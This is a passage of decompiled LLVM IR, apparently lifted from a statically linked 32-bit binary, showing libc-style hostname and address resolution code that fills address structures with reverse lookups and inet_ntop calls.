dec_label_pc_805d83b:                             ; preds = %dec_label_pc_805d837, %dec_label_pc_805d7b9
  %v0_805d83f = phi i32 [ %storemerge7, %dec_label_pc_805d837 ], [ -3, %dec_label_pc_805d7b9 ]
  %v0_805d83b = load i32, i32* @ebx, align 4
  %v1_805d83b = icmp eq i32 %v0_805d83b, 0
  br i1 %v1_805d83b, label %dec_label_pc_805d85c, label %dec_label_pc_805d83f

dec_label_pc_805d83f:                             ; preds = %dec_label_pc_805d83b
  %v10_805d83f = icmp eq i32 %v0_805d83f, -3
  %v1_805d842 = icmp eq i1 %v10_805d83f, false
  br i1 %v1_805d842, label %dec_label_pc_805d852, label %dec_label_pc_805d844

dec_label_pc_805d844:                             ; preds = %dec_label_pc_805d83f
  store i32 3, i32* %eax.global-to-local, align 4
  %v10_805d849 = icmp eq i32 %v0_805d83b, -3
  br i1 %v10_805d849, label %dec_label_pc_805dbda, label %dec_label_pc_805d852

dec_label_pc_805d852:                             ; preds = %dec_label_pc_805d844, %dec_label_pc_805d83f
  store i32 259, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805dbda

dec_label_pc_805d85c:                             ; preds = %dec_label_pc_805d820.preheader, %dec_label_pc_805d7f2, %dec_label_pc_805d837.thread, %dec_label_pc_805d7cd, %dec_label_pc_805d83b, %dec_label_pc_805d837, %dec_label_pc_805d640, %dec_label_pc_805d633
  %v3_805d85c = load i32, i32* %stack_var_-24, align 4
  store i32 %v3_805d85c, i32* %eax.global-to-local, align 4
  %v1_805d85f = add i32 %v3_805d85c, 4
  %v2_805d85f = inttoptr i32 %v1_805d85f to i32*
  %v3_805d85f = load i32, i32* %v2_805d85f, align 4
  %v4_805d85f = icmp eq i32 %v3_805d85f, 0
  %v1_805d863 = icmp eq i1 %v4_805d85f, false
  br i1 %v1_805d863, label %dec_label_pc_805d917, label %dec_label_pc_805dbb8

dec_label_pc_805d86e:                             ; preds = %dec_label_pc_805d4d3
  %v8_805d876 = ptrtoint i32* %stack_var_-224 to i32
  store i32 %v8_805d876, i32* %eax.global-to-local, align 4
  store i32 %v8_805d876, i32* %stack_var_-24, align 4
  store i32 %v8_805d876, i32* @ebx, align 4
  %tmp162 = bitcast i32* %stack_var_-224 to i8*
  store i8* %tmp162, i8** %stack_var_-252, align 4
  %v5_805d883 = call i32 @__GI_memset(i8* %tmp162, i32 0, i32 28)
  store i32 %v5_805d883, i32* %eax.global-to-local, align 4
  store i32 %arg3, i32* %edx.global-to-local, align 4
  %v3_805d88e = load i32, i32* %v2_805d272, align 4
  %v4_805d88e = icmp eq i32 %v3_805d88e, 0
  %v1_805d892 = icmp eq i1 %v4_805d88e, false
  br i1 %v1_805d892, label %dec_label_pc_805d8b5, label %dec_label_pc_805d894

dec_label_pc_805d894:                             ; preds = %dec_label_pc_805d86e
  %v3_805d897 = load i32, i32* %stack_var_-24, align 4
  store i32 %v3_805d897, i32* %edx.global-to-local, align 4
  %v8_805d89e = ptrtoint i32* %stack_var_-272 to i32
  %v2_805d8a1 = inttoptr i32 %v3_805d897 to i32*
  store i32 %v8_805d89e, i32* %v2_805d8a1, align 4
  %v3_805d8a4 = load i32, i32* %stack_var_-24, align 4
  store i32 %v3_805d8a4, i32* %eax.global-to-local, align 4
  %v1_805d8ab = inttoptr i32 %v3_805d8a4 to i32*
  %v2_805d8ab = load i32, i32* %v1_805d8ab, align 4
  %v3_805d8ad = inttoptr i32 %v2_805d8ab to i8*
  %v4_805d8ad = call i32 @__GI_memset(i8* %v3_805d8ad, i32 0, i32 28)
  store i32 %v4_805d8ad, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805d8b5

dec_label_pc_805d8b5:                             ; preds = %dec_label_pc_805d86e, %dec_label_pc_805d894
  store i32 %arg3, i32* %ecx.global-to-local, align 4
  %v3_805d8b8 = load i32, i32* %v2_805d272, align 4
  store i32 %v3_805d8b8, i32* %eax.global-to-local, align 4
  %v1_805d8bb = icmp eq i32 %v3_805d8b8, 0
  br i1 %v1_805d8bb, label %dec_label_pc_805d8c4, label %dec_label_pc_805d8bf

dec_label_pc_805d8bf:                             ; preds = %dec_label_pc_805d8b5
  %v9_805d8bf = icmp eq i32 %v3_805d8b8, 10
  %v1_805d8c2 = icmp eq i1 %v9_805d8bf, false
  br i1 %v1_805d8c2, label %dec_label_pc_805d8f2, label %dec_label_pc_805d8c4

dec_label_pc_805d8c4:                             ; preds = %dec_label_pc_805d8bf, %dec_label_pc_805d8b5
  %v3_805d8c4 = load i32, i32* %stack_var_-24, align 4
  %v1_805d8c7 = add i32 %v3_805d8c4, 4
  %v2_805d8c7 = inttoptr i32 %v1_805d8c7 to i32*
  store i32 10, i32* %v2_805d8c7, align 4
  store i32 %arg3, i32* %eax.global-to-local, align 4
  %v2_805d8d1 = load i8, i8* %tmp118, align 1
  %v3_805d8d1 = urem i8 %v2_805d8d1, 2
  %v4_805d8d1 = icmp eq i8 %v3_805d8d1, 0
  %v1_805d8d4 = icmp eq i1 %v4_805d8d1, false
  br i1 %v1_805d8d4, label %dec_label_pc_805d8ed, label %dec_label_pc_805d8d6

dec_label_pc_805d8d6:                             ; preds = %dec_label_pc_805d8c4
  %v3_805d8d6 = load i32, i32* %stack_var_-24, align 4
  %v1_805d8da = add i32 %v3_805d8d6, 8
  store i32 %v1_805d8da, i32* %eax.global-to-local, align 4
  %v5_805d8e4 = inttoptr i32 %v1_805d8da to i8*
  store i8* %v5_805d8e4, i8** %stack_var_-252, align 4
  %tmp163 = inttoptr i32 %v1_805d8da to i16*
  %v5_805d8e5 = call i32 @memcpy(i16* %tmp163, i32 ptrtoint (i32* @global_var_806d798.717 to i32), i32 16)
  store i32 %v5_805d8e5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805d8ed

dec_label_pc_805d8ed:                             ; preds = %dec_label_pc_805d8c4, %dec_label_pc_805d8d6
  %v3_805d8ed = load i32, i32* %stack_var_-24, align 4
  store i32 %v3_805d8ed, i32* %eax.global-to-local, align 4
  %v1_805d8f0 = inttoptr i32 %v3_805d8ed to i32*
  %v2_805d8f0 = load i32, i32* %v1_805d8f0, align 4
  store i32 %v2_805d8f0, i32* @ebx, align 4
  br label %dec_label_pc_805d8f2

dec_label_pc_805d8f2:                             ; preds = %dec_label_pc_805d8bf, %dec_label_pc_805d8ed
  store i32 %arg3, i32* %edx.global-to-local, align 4
  %v3_805d8f5 = load i32, i32* %v2_805d272, align 4
  store i32 %v3_805d8f5, i32* %eax.global-to-local, align 4
  %v1_805d8f8 = icmp eq i32 %v3_805d8f5, 0
  br i1 %v1_805d8f8, label %dec_label_pc_805d901, label %dec_label_pc_805d8fc

dec_label_pc_805d8fc:                             ; preds = %dec_label_pc_805d8f2
  %v9_805d8fc = icmp eq i32 %v3_805d8f5, 2
  %v1_805d8ff = icmp eq i1 %v9_805d8fc, false
  br i1 %v1_805d8ff, label %dec_label_pc_805d917, label %dec_label_pc_805d901

dec_label_pc_805d901:                             ; preds = %dec_label_pc_805d8fc, %dec_label_pc_805d8f2
  %v0_805d901 = load i32, i32* @ebx, align 4
  %v1_805d901 = add i32 %v0_805d901, 4
  %v2_805d901 = inttoptr i32 %v1_805d901 to i32*
  store i32 2, i32* %v2_805d901, align 4
  store i32 %arg3, i32* %ecx.global-to-local, align 4
  %v2_805d90b = load i8, i8* %tmp118, align 1
  %v3_805d90b = urem i8 %v2_805d90b, 2
  %v4_805d90b = icmp eq i8 %v3_805d90b, 0
  %v1_805d90e = icmp eq i1 %v4_805d90b, false
  br i1 %v1_805d90e, label %dec_label_pc_805d917, label %dec_label_pc_805d910

dec_label_pc_805d910:                             ; preds = %dec_label_pc_805d901
  %v0_805d910 = load i32, i32* @ebx, align 4
  %v1_805d910 = add i32 %v0_805d910, 8
  %v2_805d910 = inttoptr i32 %v1_805d910 to i32*
  store i32 16777343, i32* %v2_805d910, align 4
  br label %dec_label_pc_805d917

dec_label_pc_805d917:                             ; preds = %dec_label_pc_805d901, %dec_label_pc_805d8fc, %dec_label_pc_805d85c, %dec_label_pc_805d910
  %v4_805d917 = icmp eq i32 %arg4, 0
  br i1 %v4_805d917, label %dec_label_pc_805dbd8, label %dec_label_pc_805d921

dec_label_pc_805d921:                             ; preds = %dec_label_pc_805d917
  %v3_805d921 = load i32, i32* %stack_var_-24, align 4
  store i32 %v3_805d921, i32* @edi, align 4
  store i8* null, i8** %stack_var_-148, align 4
  %v1_805dba041 = icmp eq i32 %v3_805d921, 0
  %v1_805dba248 = icmp eq i1 %v1_805dba041, false
  br i1 %v1_805dba248, label %dec_label_pc_805d933.lr.ph, label %dec_label_pc_805dbd8

dec_label_pc_805d933.lr.ph:                       ; preds = %dec_label_pc_805d921
  %v1_805da75 = inttoptr i32 %arg3 to i32*
  %v2_805d966 = ptrtoint i8** %stack_var_-32 to i32
  %v2_805d97c = ptrtoint i32* %stack_var_-28 to i32
  %v2_805d986 = ptrtoint i32* %stack_var_-68 to i32
  %v2_805d9bf = ptrtoint i32* %stack_var_-114 to i32
  %tmp164 = bitcast i8** %stack_var_-148 to i32*
  br label %dec_label_pc_805d933

dec_label_pc_805d933:                             ; preds = %dec_label_pc_805d933.lr.ph, %dec_label_pc_805db9e
  %v0_805d95799 = phi i32 [ %v3_805d921, %dec_label_pc_805d933.lr.ph ], [ %v2_805db9e, %dec_label_pc_805db9e ]
  %stack_var_16.150 = phi i32 [ %arg4, %dec_label_pc_805d933.lr.ph ], [ %stack_var_16.0.lcssa, %dec_label_pc_805db9e ]
  %stack_var_-132.149 = phi i32 [ %tmp108, %dec_label_pc_805d933.lr.ph ], [ %stack_var_-132.0, %dec_label_pc_805db9e ]
  store i32 %arg3, i32* %eax.global-to-local, align 4
  %v2_805d940 = load i8, i8* %tmp118, align 1
  %v3_805d940 = and i8 %v2_805d940, 2
  %v4_805d940 = icmp eq i8 %v3_805d940, 0
  br i1 %v4_805d940, label %dec_label_pc_805da08, label %dec_label_pc_805d949

dec_label_pc_805d949:                             ; preds = %dec_label_pc_805d933
  store i32 0, i32* %stack_var_-28, align 4
  br label %dec_label_pc_805d955

dec_label_pc_805d955:                             ; preds = %dec_label_pc_805d9a4.dec_label_pc_805d955_crit_edge, %dec_label_pc_805d949
  %v0_805d957 = phi i32 [ %v0_805d957.pre, %dec_label_pc_805d9a4.dec_label_pc_805d955_crit_edge ], [ %v0_805d95799, %dec_label_pc_805d949 ]
  %v0_805d955 = phi i32 [ %v0_805d955.pre, %dec_label_pc_805d9a4.dec_label_pc_805d955_crit_edge ], [ 512, %dec_label_pc_805d949 ]
  %v2_805d955 = mul i32 %v0_805d955, 2
  store i32 %v2_805d955, i32* @esi, align 4
  %v1_805d957 = add i32 %v0_805d957, 4
  %v2_805d957 = inttoptr i32 %v1_805d957 to i32*
  %v3_805d957 = load i32, i32* %v2_805d957, align 4
  store i32 %v3_805d957, i32* @ebx, align 4
  %v1_805d95a = add i32 %v0_805d957, 8
  %v1_805d95d = add i32 %v2_805d955, 30
  %v1_805d963 = and i32 %v1_805d95d, -16
  %v0_805d969 = load i32, i32* @esp, align 4
  %v2_805d969 = sub i32 %v0_805d969, %v1_805d963
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_805d96d = add i32 %v2_805d969, 15
  store i32 %v1_805d96d, i32* %ecx.global-to-local, align 4
  %v2_805d971 = add i32 %v2_805d969, -4
  %v3_805d971 = inttoptr i32 %v2_805d971 to i32*
  store i32 %v2_805d966, i32* %v3_805d971, align 4
  %v0_805d972 = load i32, i32* %ecx.global-to-local, align 4
  %v1_805d972 = and i32 %v0_805d972, -16
  store i32 %v1_805d972, i32* %ecx.global-to-local, align 4
  %v0_805d975 = load i32, i32* @ebx, align 4
  %v9_805d975 = icmp eq i32 %v0_805d975, 10
  %v1_805d978 = zext i1 %v9_805d975 to i32
  %v2_805d978 = load i32, i32* %eax.global-to-local, align 4
  %v3_805d978 = and i32 %v2_805d978, -256
  %v4_805d978 = or i32 %v3_805d978, %v1_805d978
  %v1_805d97b = add i32 %v4_805d978, -1
  %v1_805d97f = and i32 %v1_805d97b, -12
  store i32 %v1_805d97f, i32* %eax.global-to-local, align 4
  %v2_805d982 = add i32 %v2_805d969, -8
  %v3_805d982 = inttoptr i32 %v2_805d982 to i32*
  store i32 %v2_805d97c, i32* %v3_805d982, align 4
  %v0_805d983 = load i32, i32* %eax.global-to-local, align 4
  %v1_805d983 = add i32 %v0_805d983, 16
  store i32 %v1_805d983, i32* %eax.global-to-local, align 4
  store i32 %v2_805d986, i32* %edx.global-to-local, align 4
  %v0_805d989 = load i32, i32* @esi, align 4
  %v2_805d989 = add i32 %v2_805d969, -12
  %v3_805d989 = inttoptr i32 %v2_805d989 to i32*
  store i32 %v0_805d989, i32* %v3_805d989, align 4
  %v0_805d98a = load i32, i32* %ecx.global-to-local, align 4
  %v2_805d98a = add i32 %v2_805d969, -16
  %v3_805d98a = inttoptr i32 %v2_805d98a to i32*
  store i32 %v0_805d98a, i32* %v3_805d98a, align 4
  %v2_805d98b = add i32 %v2_805d969, -20
  %v3_805d98b = inttoptr i32 %v2_805d98b to i32*
  store i32 %v2_805d986, i32* %v3_805d98b, align 4
  %v0_805d98c = load i32, i32* @ebx, align 4
  %v2_805d98c = add i32 %v2_805d969, -24
  %v3_805d98c = inttoptr i32 %v2_805d98c to i32*
  store i32 %v0_805d98c, i32* %v3_805d98c, align 4
  %v0_805d98d = load i32, i32* %eax.global-to-local, align 4
  %v2_805d98d = add i32 %v2_805d969, -28
  %v3_805d98d = inttoptr i32 %v2_805d98d to i32*
  store i32 %v0_805d98d, i32* %v3_805d98d, align 4
  %v5_805d98e = add i32 %v2_805d969, -32
  %v6_805d98e = inttoptr i32 %v5_805d98e to i32*
  store i32 %v1_805d95a, i32* %v6_805d98e, align 4
  %v1_805d991 = inttoptr i32 %v1_805d95a to i8*
  %v2_805d991 = call i32 @__GI_gethostbyaddr_r(i8* %v1_805d991)
  store i32 %v2_805d991, i32* %eax.global-to-local, align 4
  store i32 %v2_805d991, i32* @ebx, align 4
  %v1_805d99b = call i32 @__errno_location(i32 %v1_805d95a)
  store i32 %v1_805d99b, i32* %eax.global-to-local, align 4
  %v2_805d9a0 = inttoptr i32 %v1_805d99b to i32*
  %v3_805d9a0 = load i32, i32* %v2_805d9a0, align 4
  %v14_805d9a0 = icmp eq i32 %v2_805d991, %v3_805d9a0
  %v1_805d9a2 = icmp eq i1 %v14_805d9a0, false
  br i1 %v1_805d9a2, label %dec_label_pc_805d9aa, label %dec_label_pc_805d9a4

dec_label_pc_805d9a4:                             ; preds = %dec_label_pc_805d955
  %v3_805d9a4 = load i8*, i8** %stack_var_-32, align 4
  %v14_805d9a4 = icmp eq i8* %v3_805d9a4, inttoptr (i32 -1 to i8*)
  br i1 %v14_805d9a4, label %dec_label_pc_805d9a4.dec_label_pc_805d955_crit_edge, label %dec_label_pc_805d9aa

dec_label_pc_805d9a4.dec_label_pc_805d955_crit_edge: ; preds = %dec_label_pc_805d9a4
  %v0_805d955.pre = load i32, i32* @esi, align 4
  %v0_805d957.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805d955

dec_label_pc_805d9aa:                             ; preds = %dec_label_pc_805d9a4, %dec_label_pc_805d955
  %v1_805d9aa = icmp eq i32 %v2_805d991, 0
  br i1 %v1_805d9aa, label %dec_label_pc_805d9b8, label %dec_label_pc_805d9ae

dec_label_pc_805d9ae:                             ; preds = %dec_label_pc_805d9aa
  %v3_805d9ae = load i8*, i8** %stack_var_-32, align 4
  %v14_805d9ae = icmp eq i8* %v3_805d9ae, inttoptr (i32 -1 to i8*)
  br i1 %v14_805d9ae, label %dec_label_pc_805dbbf, label %dec_label_pc_805d9b8

dec_label_pc_805d9b8:                             ; preds = %dec_label_pc_805d9ae, %dec_label_pc_805d9aa
  %v3_805d9b8 = load i32, i32* %stack_var_-28, align 4
  store i32 %v3_805d9b8, i32* %eax.global-to-local, align 4
  %v1_805d9bb = icmp eq i32 %v3_805d9b8, 0
  %v1_805d9bd = icmp eq i1 %v1_805d9bb, false
  br i1 %v1_805d9bd, label %dec_label_pc_805d9db, label %dec_label_pc_805d9bf

dec_label_pc_805d9bf:                             ; preds = %dec_label_pc_805d9b8
  store i32 %v2_805d9bf, i32* %eax.global-to-local, align 4
  %v0_805d9c2 = load i32, i32* @esp, align 4
  %v1_805d9c2 = add i32 %v0_805d9c2, -4
  %v2_805d9c2 = inttoptr i32 %v1_805d9c2 to i32*
  store i32 46, i32* %v2_805d9c2, align 4
  %v2_805d9c4 = add i32 %v0_805d9c2, -8
  %v3_805d9c4 = inttoptr i32 %v2_805d9c4 to i32*
  store i32 %v2_805d9bf, i32* %v3_805d9c4, align 4
  %v5_805d9c5 = add i32 %v0_805d9c2, -12
  %v6_805d9c5 = inttoptr i32 %v5_805d9c5 to i32*
  store i32 %v1_805d95a, i32* %v6_805d9c5, align 4
  %v0_805d9c8 = load i32, i32* @edi, align 4
  %v1_805d9c8 = add i32 %v0_805d9c8, 4
  %v2_805d9c8 = inttoptr i32 %v1_805d9c8 to i32*
  %v3_805d9c8 = load i32, i32* %v2_805d9c8, align 4
  %v5_805d9c8 = add i32 %v0_805d9c2, -16
  %v6_805d9c8 = inttoptr i32 %v5_805d9c8 to i32*
  store i32 %v3_805d9c8, i32* %v6_805d9c8, align 4
  %v5_805d9cb = call i32 @__GI_inet_ntop(i32 %v1_805d95a, i32 ptrtoint (i32* @0 to i32), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_805d9cb, i32* %eax.global-to-local, align 4
  store i32 %v5_805d9cb, i32* %tmp164, align 4
  %tmp165 = inttoptr i32 %v5_805d9cb to i8*
  br label %dec_label_pc_805d9e3

dec_label_pc_805d9db:                             ; preds = %dec_label_pc_805d9b8
  %v1_805d9db = inttoptr i32 %v3_805d9b8 to i32*
  %v2_805d9db = load i32, i32* %v1_805d9db, align 4
  store i32 %v2_805d9db, i32* %eax.global-to-local, align 4
  %v5_805d9dd = inttoptr i32 %v2_805d9db to i8*
  store i8* %v5_805d9dd, i8** %stack_var_-148, align 4
  br label %dec_label_pc_805d9e3

dec_label_pc_805d9e3:                             ; preds = %dec_label_pc_805d9bf, %dec_label_pc_805d9db
  %v3_805d9f3 = phi i8* [ %tmp165, %dec_label_pc_805d9bf ], [ %v5_805d9dd, %dec_label_pc_805d9db ]
  %v5_805d9e3 = icmp eq i8* %v3_805d9f3, null
  br i1 %v5_805d9e3, label %dec_label_pc_805dbb8, label %dec_label_pc_805d9f0

dec_label_pc_805d9f0:                             ; preds = %dec_label_pc_805d9e3
  %v4_805d9e3 = ptrtoint i8* %v3_805d9f3 to i32
  %v0_805d9f0 = load i32, i32* @esp, align 4
  %v6_805d9f3 = add i32 %v0_805d9f0, -16
  %v7_805d9f3 = inttoptr i32 %v6_805d9f3 to i32*
  store i32 %v4_805d9e3, i32* %v7_805d9f3, align 4
  %v0_805d9f9 = load i8*, i8** %stack_var_-148, align 4
  %v3_805d9f9 = call i32 @strlen(i8* %v0_805d9f9)
  %v1_805da01 = add i32 %v3_805d9f9, 1
  store i32 %v1_805da01, i32* %eax.global-to-local, align 4
  %v0_805da08.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805da08

dec_label_pc_805da08:                             ; preds = %dec_label_pc_805d933, %dec_label_pc_805d9f0
  %v0_805da08 = phi i32 [ %v0_805d95799, %dec_label_pc_805d933 ], [ %v0_805da08.pre, %dec_label_pc_805d9f0 ]
  %stack_var_-132.0 = phi i32 [ %stack_var_-132.149, %dec_label_pc_805d933 ], [ %v1_805d95a, %dec_label_pc_805d9f0 ]
  %stack_var_-140.0 = phi i32 [ 0, %dec_label_pc_805d933 ], [ %v1_805da01, %dec_label_pc_805d9f0 ]
  %v1_805da08 = add i32 %v0_805da08, 4
  %v2_805da08 = inttoptr i32 %v1_805da08 to i32*
  %v3_805da08 = load i32, i32* %v2_805da08, align 4
  %v12_805da08 = icmp eq i32 %v3_805da08, 10
  br i1 %v12_805da08, label %dec_label_pc_805da3f, label %dec_label_pc_805da0e

dec_label_pc_805da0e:                             ; preds = %dec_label_pc_805da08
  %v3_805da0e = load i32, i32* %stack_var_-156, align 4
  %v4_805da0e = icmp eq i32 %v3_805da0e, 0
  %. = select i1 %v4_805da0e, i32 16, i32 28
  %.16 = select i1 %v4_805da0e, i16 2, i16 10
  br label %dec_label_pc_805da3f

dec_label_pc_805da3f:                             ; preds = %dec_label_pc_805da0e, %dec_label_pc_805da08
  %storemerge15 = phi i32 [ 28, %dec_label_pc_805da08 ], [ %., %dec_label_pc_805da0e ]
  %storemerge11 = phi i16 [ 10, %dec_label_pc_805da08 ], [ %.16, %dec_label_pc_805da0e ]
  %storemerge930 = load i32, i32* %stack_var_-20, align 4
  store i32 %storemerge930, i32* @esi, align 4
  %v1_805db9631 = icmp eq i32 %storemerge930, 0
  %v1_805db9838 = icmp eq i1 %v1_805db9631, false
  br i1 %v1_805db9838, label %dec_label_pc_805da47.lr.ph, label %dec_label_pc_805db9e

dec_label_pc_805da47.lr.ph:                       ; preds = %dec_label_pc_805da3f
  %v1_805da5b17 = zext i16 %storemerge11 to i32
  %v10_805dab6 = icmp eq i16 %storemerge11, 10
  %v4_805db25 = inttoptr i32 %v1_805da5b17 to i16*
  %v4_805db3c = inttoptr i32 %v1_805da5b17 to i8*
  %v2_805db58 = or i32 %storemerge15, 32
  %v3_805da56 = add i32 %v2_805db58, %stack_var_-140.0
  %v1_805dac5 = icmp eq i1 %v10_805dab6, false
  br label %dec_label_pc_805da47

dec_label_pc_805da47:                             ; preds = %dec_label_pc_805da47.lr.ph, %dec_label_pc_805db80
  %stack_var_16.039 = phi i32 [ %stack_var_16.150, %dec_label_pc_805da47.lr.ph ], [ %v1_805db8e, %dec_label_pc_805db80 ]
  store i32 %stack_var_-140.0, i32* @ecx, align 4
  store i32 %storemerge15, i32* %edx.global-to-local, align 4
  %v0_805da53 = load i32, i32* @esp, align 4
  store i32 %v3_805da56, i32* %eax.global-to-local, align 4
  %v2_805da5a = add i32 %v0_805da53, -16
  %v3_805da5a = inttoptr i32 %v2_805da5a to i32*
  store i32 %v3_805da56, i32* %v3_805da5a, align 4
  %v2_805da5b = call i32 @malloc(i32 %v1_805da5b17)
  store i32 %v2_805da5b, i32* %eax.global-to-local, align 4
  store i32 %stack_var_16.039, i32* %ecx.global-to-local, align 4
  store i32 %v2_805da5b, i32* %edx.global-to-local, align 4
  %v1_805da68 = icmp eq i32 %v2_805da5b, 0
  %v2_805da6a = inttoptr i32 %stack_var_16.039 to i32*
  store i32 %v2_805da5b, i32* %v2_805da6a, align 4
  br i1 %v1_805da68, label %dec_label_pc_805dbd1, label %dec_label_pc_805da72

dec_label_pc_805da72:                             ; preds = %dec_label_pc_805da47
  store i32 %arg3, i32* %ecx.global-to-local, align 4
  %v2_805da75 = load i32, i32* %v1_805da75, align 4
  %v1_805da77 = load i32, i32* %edx.global-to-local, align 4
  %v2_805da77 = inttoptr i32 %v1_805da77 to i32*
  store i32 %v2_805da75, i32* %v2_805da77, align 4
  store i32 %stack_var_16.039, i32* %eax.global-to-local, align 4
  %v2_805da7c = load i32, i32* %v2_805da6a, align 4
  store i32 %v2_805da7c, i32* %edx.global-to-local, align 4
  store i32 %v1_805da5b17, i32* %eax.global-to-local, align 4
  %v2_805da85 = add i32 %v2_805da7c, 4
  %v3_805da85 = inttoptr i32 %v2_805da85 to i32*
  store i32 %v1_805da5b17, i32* %v3_805da85, align 4
  store i32 %stack_var_16.039, i32* %ecx.global-to-local, align 4
  %v0_805da8b = load i32, i32* @esi, align 4
  %v1_805da8b = add i32 %v0_805da8b, 4
  %v2_805da8b = inttoptr i32 %v1_805da8b to i32*
  %v3_805da8b = load i32, i32* %v2_805da8b, align 4
  store i32 %v3_805da8b, i32* %eax.global-to-local, align 4
  %v2_805da8e = load i32, i32* %v2_805da6a, align 4
  store i32 %v2_805da8e, i32* %edx.global-to-local, align 4
  %v2_805da90 = add i32 %v2_805da8e, 8
  %v3_805da90 = inttoptr i32 %v2_805da90 to i32*
  store i32 %v3_805da8b, i32* %v3_805da90, align 4
  %v0_805da93 = load i32, i32* %ecx.global-to-local, align 4
  %v1_805da93 = inttoptr i32 %v0_805da93 to i32*
  %v2_805da93 = load i32, i32* %v1_805da93, align 4
  store i32 %v2_805da93, i32* %edx.global-to-local, align 4
  %v0_805da95 = load i32, i32* @esi, align 4
  %v1_805da95 = add i32 %v0_805da95, 8
  %v2_805da95 = inttoptr i32 %v1_805da95 to i32*
  %v3_805da95 = load i32, i32* %v2_805da95, align 4
  store i32 %v3_805da95, i32* %eax.global-to-local, align 4
  %v2_805da98 = add i32 %v2_805da93, 12
  %v3_805da98 = inttoptr i32 %v2_805da98 to i32*
  store i32 %v3_805da95, i32* %v3_805da98, align 4
  %v0_805da9b = load i32, i32* %ecx.global-to-local, align 4
  %v1_805da9b = inttoptr i32 %v0_805da9b to i32*
  %v2_805da9b = load i32, i32* %v1_805da9b, align 4
  store i32 %v2_805da9b, i32* %eax.global-to-local, align 4
  store i32 %storemerge15, i32* %edx.global-to-local, align 4
  %v2_805daa3 = add i32 %v2_805da9b, 16
  %v3_805daa3 = inttoptr i32 %v2_805daa3 to i32*
  store i32 %storemerge15, i32* %v3_805daa3, align 4
  %v0_805daa6 = load i32, i32* %ecx.global-to-local, align 4
  %v1_805daa6 = inttoptr i32 %v0_805daa6 to i32*
  %v2_805daa6 = load i32, i32* %v1_805daa6, align 4
  store i32 %v2_805daa6, i32* %edx.global-to-local, align 4
  %v1_805daa8 = add i32 %v2_805daa6, 32
  store i32 %v1_805daa8, i32* %eax.global-to-local, align 4
  %v2_805daab = add i32 %v2_805daa6, 20
  %v3_805daab = inttoptr i32 %v2_805daab to i32*
  store i32 %v1_805daa8, i32* %v3_805daab, align 4
  %v0_805daae = load i32, i32* %ecx.global-to-local, align 4
  %v1_805daae = inttoptr i32 %v0_805daae to i32*
  %v2_805daae = load i32, i32* %v1_805daae, align 4
  store i32 %v2_805daae, i32* %eax.global-to-local, align 4
  store i32 %v1_805da5b17, i32* %ecx.global-to-local, align 4
  %v1_805daba = add i32 %v2_805daae, 20
  %v2_805daba = inttoptr i32 %v1_805daba to i32*
  %v3_805daba = load i32, i32* %v2_805daba, align 4
  %v3_805dabd = inttoptr i32 %v3_805daba to i16*
  store i16 %storemerge11, i16* %v3_805dabd, align 2
  store i32 %stack_var_16.039, i32* %eax.global-to-local, align 4
  %v2_805dac3 = load i32, i32* %v2_805da6a, align 4
  store i32 %v2_805dac3, i32* %edx.global-to-local, align 4
  %v1_805db17 = add i32 %v2_805dac3, 20
  %v2_805db17 = inttoptr i32 %v1_805db17 to i32*
  %v3_805db17 = load i32, i32* %v2_805db17, align 4
  store i32 %v3_805db17, i32* @ebx, align 4
  %v0_805db1a = load i32, i32* @edi, align 4
  %v1_805db1a = add i32 %v0_805db1a, 8
  store i32 %v1_805db1a, i32* %eax.global-to-local, align 4
  br i1 %v1_805dac5, label %dec_label_pc_805db17, label %dec_label_pc_805dac7

dec_label_pc_805dac7:                             ; preds = %dec_label_pc_805da72
  %v1_805dacd = add i32 %v3_805db17, 4
  %v2_805dacd = inttoptr i32 %v1_805dacd to i32*
  store i32 0, i32* %v2_805dacd, align 4
  %v0_805dad4 = load i32, i32* @edi, align 4
  %v1_805dad4 = add i32 %v0_805dad4, 4
  %v2_805dad4 = inttoptr i32 %v1_805dad4 to i32*
  %v3_805dad4 = load i32, i32* %v2_805dad4, align 4
  %v12_805dad4 = icmp eq i32 %v3_805dad4, 10
  %v1_805dad8 = icmp eq i1 %v12_805dad4, false
  br i1 %v1_805dad8, label %dec_label_pc_805dae3, label %dec_label_pc_805dada

dec_label_pc_805dada:                             ; preds = %dec_label_pc_805dac7
  %v0_805dada = load i32, i32* %ecx.global-to-local, align 4
  %v1_805dada = load i32, i32* @esp, align 4
  %v2_805dada = add i32 %v1_805dada, -4
  %v3_805dada = inttoptr i32 %v2_805dada to i32*
  store i32 %v0_805dada, i32* %v3_805dada, align 4
  %v1_805dadb = add i32 %v1_805dada, -8
  %v2_805dadb = inttoptr i32 %v1_805dadb to i32*
  store i32 16, i32* %v2_805dadb, align 4
  %v0_805dadd = load i32, i32* %eax.global-to-local, align 4
  %v2_805dadd = add i32 %v1_805dada, -12
  %v3_805dadd = inttoptr i32 %v2_805dadd to i32*
  store i32 %v0_805dadd, i32* %v3_805dadd, align 4
  %v0_805dade = load i32, i32* @ebx, align 4
  %v1_805dade = add i32 %v0_805dade, 8
  br label %dec_label_pc_805daff

dec_label_pc_805dae3:                             ; preds = %dec_label_pc_805dac7
  %v0_805dae3 = load i32, i32* @ebx, align 4
  %v1_805dae3 = add i32 %v0_805dae3, 8
  %v2_805dae3 = inttoptr i32 %v1_805dae3 to i32*
  store i32 0, i32* %v2_805dae3, align 4
  %v0_805daea = load i32, i32* @ebx, align 4
  %v1_805daea = add i32 %v0_805daea, 12
  %v2_805daea = inttoptr i32 %v1_805daea to i32*
  store i32 0, i32* %v2_805daea, align 4
  %v0_805daf1 = load i32, i32* @ebx, align 4
  %v1_805daf1 = add i32 %v0_805daf1, 16
  %v2_805daf1 = inttoptr i32 %v1_805daf1 to i32*
  store i32 -65536, i32* %v2_805daf1, align 4
  %v0_805daf8 = load i32, i32* %edx.global-to-local, align 4
  %v1_805daf8 = load i32, i32* @esp, align 4
  %v2_805daf8 = add i32 %v1_805daf8, -4
  %v3_805daf8 = inttoptr i32 %v2_805daf8 to i32*
  store i32 %v0_805daf8, i32* %v3_805daf8, align 4
  %v1_805daf9 = add i32 %v1_805daf8, -8
  %v2_805daf9 = inttoptr i32 %v1_805daf9 to i32*
  store i32 4, i32* %v2_805daf9, align 4
